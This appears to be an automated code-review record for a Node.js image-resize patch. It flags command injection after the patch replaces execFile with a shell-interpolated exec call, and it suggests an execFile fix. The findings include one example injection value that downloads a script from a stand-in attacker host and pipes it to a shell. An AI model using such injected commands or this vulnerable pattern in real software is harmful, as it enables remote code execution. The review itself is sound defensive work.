findings.body:
Interpolating `filter` and `src` into `child_process.exec` runs them through a shell. A filter such as `Lanczos; wget http://evil.example/x | sh` or a path containing `$(...)` / `` `...` `` executes as a host command. ImageMagick `-filter` takes a single argv token, so pass each value through `execFile` (and restore that import):

```suggestion
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) => e ? rej(e) : res("/tmp/out.png"));
```

summary:
Command injection on the new `exec` path — this needs to be fixed before merge.

`resize` previously invoked ImageMagick with `execFile` and an argv array, so `src` could not break out of the process arguments. This change switches to `child_process.exec` and interpolates `src`, `filter`, and `w` into a shell string. The new `filter` argument is documented as a user-composed expression and is unquoted; `src` is only double-quoted, which still expands `$()` and backticks. That is a remote-code-execution primitive on any host that calls `resize` with untrusted input.

Keep `execFile` and pass `-filter` as its own argv element. No in-repo callers of `resize` showed up, so the new required middle parameter is an untested public-signature change as well; existing `resize(src, w)` call sites would treat a width number as the filter string.

**Recommendation:** request-changes

verification.reason: The patch replaces execFile with exec and interpolates unsanitized `src` and `filter` into a shell command string, enabling command injection. Base used argv-array execFile; the new API exposes attacker-controllable shell metacharacters.
